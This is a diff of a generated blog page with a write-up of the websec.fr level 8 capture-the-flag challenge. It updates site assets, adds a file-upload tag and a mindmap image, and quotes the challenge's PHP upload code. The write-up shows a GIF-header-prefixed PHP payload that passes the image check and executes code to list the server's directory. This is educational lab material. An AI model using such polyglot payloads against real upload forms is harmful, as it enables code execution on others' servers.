@@ -20,7 +20,10 @@
 
 
 
-<script defer language="javascript" type="text/javascript" src="/js/bundle.min.91ae35f985ba4ae6473b8defee39551f3ce6ed2769fdfa9b3df93f2eac0da4bc.js"></script>
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.bdcbbcf8f635bc0cd68288a0e6baa450aa7804f1369604511debdc47dcb6db37.js"></script>
 
 
 
@@ -109,7 +112,7 @@
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.74e5930843ef626ec32719f0944c56febfdb9d5039aaeb1734297915e958db11.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.09fea74f3da3a0044259517fb25285ebd1b7ef1df24d656d00bab0a0627841ba.css">
 
 
     
@@ -235,6 +238,14 @@
                 
                         
                 
+                        
+                
+                        
+                
+                        
+                
+                        
+                
             
         
         
@@ -269,6 +280,14 @@
                 
             
                 
+                
+                        
+                
+                        
+                
+                        
+                
+                        
                 
                         
                 
@@ -317,6 +336,14 @@
                 
                         
                 
+                        
+                
+                        
+                
+                        
+                
+                        
+                
             
         
         
@@ -346,6 +373,14 @@
                 
             
                 
+                
+                        
+                
+                        
+                
+                        
+                
+                        
                 
                         
                 
@@ -394,6 +429,14 @@
                 
                         
                 
+                        
+                
+                        
+                
+                        
+                
+                        
+                
             
         
         
@@ -428,6 +471,14 @@
                 
             
                 
+                
+                        
+                
+                        
+                
+                        
+                
+                        
                 
                         
                 
@@ -541,6 +592,10 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
         <a href="http://localhost:1313/tags/websec">websec</a>
       </li>
       
+      <li class="tag-file-upload">
+        <a href="http://localhost:1313/tags/file-upload">file-upload</a>
+      </li>
+      
     </ul>
     
   </div>
@@ -551,36 +606,30 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
   
 </div>
 
-  <p>The code source of <a href="http://websec.fr/level08/index.php" target="_blank">level8</a> is <a href="http://websec.fr/level08/source.php" target="_blank">here</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span> ($_FILES) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span> ($_FILES))<span style="color:#f92672">:</span> 
+  <p>The code source of <a href="http://websec.fr/level08/index.php" target="_blank">level8</a> is <a href="http://websec.fr/level08/source.php" target="_blank">here</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$uploadedFile <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#39;%1$s/%2$s&#39;</span>, <span style="color:#e6db74">&#39;/uploads&#39;</span>, <span style="color:#a6e22e">sha1</span>($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.gif&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span> ($uploadedFile)) { <span style="color:#a6e22e">unlink</span> ($uploadedFile); }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">50000</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">getimagesize</span> ($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">exif_imagetype</span>($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]) <span style="color:#f92672">===</span> <span style="color:#a6e22e">IMAGETYPE_GIF</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">move_uploaded_file</span> ($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $uploadedFile);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;p class=&#34;lead&#34;&gt;Dump of &lt;a href=&#34;/level08&#39;</span> <span style="color:#f92672">.</span> $uploadedFile <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&#34;&gt;&#39;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlentities</span>($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/a&gt;:&lt;/p&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">include_once</span>($uploadedFile);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">unlink</span>($uploadedFile);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;p class=&#34;text-danger&#34;&gt;The file is not a GIF&lt;/p&gt;&#39;</span>; }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;p class=&#34;text-danger&#34;&gt;The file is not an image&lt;/p&gt;&#39;</span>; }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;p class=&#34;text-danger&#34;&gt;The file is too big&lt;/p&gt;&#39;</span>; }
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;div class=&#34;row&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$uploadedFile = sprintf(&#39;%1$s/%2$s&#39;, &#39;/uploads&#39;, sha1($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;.gif&#39;);
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($_FILES[&#39;fileToUpload&#39;][&#39;size&#39;] &lt;= 50000) {
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (getimagesize ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) !== false) {
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (exif_imagetype($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) === IMAGETYPE_GIF) {
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    move_uploaded_file ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;], $uploadedFile);
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    echo &#39;&lt;p class=&#34;lead&#34;&gt;Dump of &lt;a href=&#34;/level08&#39; . $uploadedFile . &#39;&#34;&gt;&#39;. htmlentities($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;&lt;/a&gt;:&lt;/p&gt;&#39;;
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    echo &#39;&lt;pre&gt;&#39;;
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    include_once($uploadedFile);
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    echo &#39;&lt;/pre&gt;&#39;;
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    unlink($uploadedFile);
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } else { echo &#39;&lt;p class=&#34;text-danger&#34;&gt;The file is not a GIF&lt;/p&gt;&#39;; }
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else { echo &#39;&lt;p class=&#34;text-danger&#34;&gt;The file is not an image&lt;/p&gt;&#39;; }
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">} else { echo &#39;&lt;p class=&#34;text-danger&#34;&gt;The file is too big&lt;/p&gt;&#39;; }
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/div&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php endif ?&gt;
 </span></span></span></code></pre></div><p>With this code we have 2 problem and that it&rsquo;s important to bypass are:</p>
 <ul>
 <li>The GIF header</li>
 <li>The size of file uploaded</li>
 </ul>
+<p>For this type of vulnerability i use my mindmap
+<img src="/images/stc/file_upload_finish.excalidraw.png" alt="alt text"></p>
 <p>So we can create a file containing this :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">GIF89a</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;./&#39;</span>)); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">;
 </span></span></span></code></pre></div><p>With <code>GIF89a</code> who is header of <strong>GIF</strong> file</p>
@@ -616,11 +665,11 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 <div class="footer">
     
 	    
-            <a class="previous-post" href="http://localhost:1313/posts/websec-fr-level17/?ref=footer"><span style="font-weight:bold;">« Previous</span><br></a>
+            <a class="previous-post" href="http://localhost:1313/posts/websec-fr-level17/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Websec.fr Level 17</a>
         
 	    
             <div class="next-post">
-                <a href="http://localhost:1313/posts/websec-fr-level2/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Websec.fr Level 02</a>
+                <a href="http://localhost:1313/posts/websec-fr-level4/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Websec.fr Level 04</a>
             </div>
         
     
